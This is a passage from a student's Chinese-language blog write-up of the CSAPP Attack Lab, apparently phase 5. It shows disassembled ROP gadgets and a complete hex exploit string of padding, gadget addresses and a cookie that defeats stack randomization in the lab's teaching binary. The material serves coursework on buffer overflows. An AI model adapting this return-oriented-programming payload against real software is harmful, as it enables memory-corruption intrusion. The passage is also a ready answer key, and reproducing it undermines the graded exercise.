+<p>解题思路来自于上面的Blog，在栈随机化的情况下，把rsp指针作为一个参考点来找到我们需要的参数。</p></blockquote>
+<p>设计的asm：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">phase5.o:</span>     <span class="nf">file</span> <span class="no">format</span> <span class="no">elf64-x86-64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">Disassembly</span> <span class="no">of</span> <span class="no">section</span> <span class="no">.text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000000000</span> <span class="err">&lt;</span><span class="na">.text</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">   <span class="err">0:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">e0</span>             	<span class="no">mov</span>    <span class="nv">%rsp</span><span class="p">,</span><span class="nv">%rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">3:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">   <span class="mi">4</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="no">c7</span>             	<span class="no">mov</span>    <span class="nv">%rax</span><span class="p">,</span><span class="nv">%rdi</span>
+</span></span><span class="line"><span class="cl">   <span class="err">7:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">   <span class="mi">8</span><span class="p">:</span>	<span class="mi">58</span>                   	<span class="no">pop</span>    <span class="nv">%rax</span>
+</span></span><span class="line"><span class="cl">   <span class="err">9:</span>	<span class="err">90</span>                   	<span class="nf">nop</span>
+</span></span><span class="line"><span class="cl">   <span class="nl">a:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">   <span class="no">b</span><span class="p">:</span>	<span class="mi">89</span> <span class="no">c1</span>                	<span class="no">mov</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%ecx</span>
+</span></span><span class="line"><span class="cl">   <span class="nl">d:</span>	<span class="err">90</span>                   	<span class="nf">nop</span>
+</span></span><span class="line"><span class="cl">   <span class="nl">e:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">   <span class="no">f</span><span class="p">:</span>	<span class="mi">89</span> <span class="no">ca</span>                	<span class="no">mov</span>    <span class="nv">%ecx</span><span class="p">,</span><span class="nv">%edx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">11:</span>	<span class="err">84</span> <span class="nf">c0</span>                	<span class="no">test</span>   <span class="nv">%al</span><span class="p">,</span><span class="nv">%al</span>
+</span></span><span class="line"><span class="cl">  <span class="err">13:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">  <span class="mi">14</span><span class="p">:</span>	<span class="mi">89</span> <span class="no">d6</span>                	<span class="no">mov</span>    <span class="nv">%edx</span><span class="p">,</span><span class="nv">%esi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">16:</span>	<span class="err">20</span> <span class="nf">d2</span>                	<span class="no">and</span>    <span class="nv">%dl</span><span class="p">,</span><span class="nv">%dl</span>
+</span></span><span class="line"><span class="cl">  <span class="err">18:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">  <span class="mi">19</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">8</span><span class="no">d</span> <span class="mi">04</span> <span class="mi">37</span>          	<span class="no">lea</span>    <span class="p">(</span><span class="nv">%rdi</span><span class="p">,</span><span class="nv">%rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="nv">%rax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">1</span><span class="nl">d:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">c7</span>             	<span class="no">mov</span>    <span class="nv">%rax</span><span class="p">,</span><span class="nv">%rdi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">20:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl"><span class="err">1</span><span class="nf">d</span> <span class="mi">1</span><span class="no">b</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="no">dc</span> <span class="mi">1</span><span class="no">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="no">c3</span> <span class="mi">1</span><span class="no">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">48</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="no">c2</span> <span class="mi">1</span><span class="no">b</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">2</span><span class="no">f</span> <span class="mi">1</span><span class="no">b</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">17</span> <span class="mi">1</span><span class="no">b</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="no">fa</span> <span class="mi">1</span><span class="no">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="no">dc</span> <span class="mi">1</span><span class="no">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">22</span> <span class="mi">1</span><span class="no">a</span> <span class="mi">40</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">31</span> <span class="mi">34</span> <span class="mi">65</span> <span class="mi">36</span> <span class="mi">36</span> <span class="mi">34</span> <span class="mi">36</span> <span class="mi">66</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+</span></span></code></pre></div><p>大功告成！！！抄别人写的就是简单啊（），如果说有难度，那其实在于你要写一串没有bug的汇编然后去找，但是看别人的就不难了（？）。</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+          
+            
+            
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="mio" src="/img/blowfish_logo_hu_2d15729eafedea4d.png" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      mio
+    </div>
+    
+    
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">I&rsquo;m Just A Student&hellip;</div>
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+          
+
+          
+
+          
+          <div class="mb-10"></div>
+          
+
+        
+
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_csapp\/CSAPP:AttackLab\/index.md"
+        var oid_likes = "likes_csapp\/CSAPP:AttackLab\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/csapp/computerorgnization/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >ComputerOrgnization</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-03-10T12:35:52&#43;08:00">10 March 2025</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/csapp/csappoptimizationlab/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >CSAPP:OptimizationLab</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-04-10T23:57:57&#43;08:00">10 April 2025</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
+            title="Categories">
+            
+            Categories
+          </a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2025
+      mio
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="http://localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
